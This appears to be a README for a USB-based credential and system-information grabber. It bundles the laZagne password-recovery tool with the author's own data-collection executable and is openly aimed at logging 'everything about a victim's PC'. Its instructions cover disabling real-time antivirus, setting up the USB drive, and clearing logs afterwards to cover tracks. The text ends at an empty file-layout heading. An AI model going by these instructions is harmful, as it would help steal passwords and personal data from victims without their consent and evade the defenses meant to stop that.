# USB User/Password and System/IP grabber+logger

I just wanna say that the laZagne.exe is NOT my script and needs to be run with a batch file.

Essentially what laZagne does, is it goes through each cached/logged user login file (which pretty much every software will log someones login info this way)

EXCEPT over the past few years since laZagne first released, the only things that have slightly changed are the arguements (which still function and output) and the way passwords get logged (ik clickbait ree fuck ya mum), 

anyway so basically it used to accurately display users AND passwords but now passwords are like encrypted in random chinese letters and the strings are long as fuck. 

### ALSO MAKE SURE YOU DISABLE REAL TIME ANTI VIRUS

The reason being that (i assume so) after the laZagne patch or whatever happened to it (mind you im not 100% cuz i cant actually see the script) The exe now shows up as it own virus i believe, it literally showed up as a "hack tool" in defender so idk just try it ig.

But its still useful for grabbing basic information
## Howeverr the oogabooga.exe is infact my own script, it basically just grabs every bit of info abt the system, user, and ip.
### Just extract the zip into your "E:" USB Drive (must be formatted to "E:")
Then just give it a test, making sure its logging properly and you have the files layed out correctly.
and thats it! You now have a usb stick that logs literally everything about a victim's PC! Clear them logs n get to fuckin shit up!

# Correct file and folder layout:
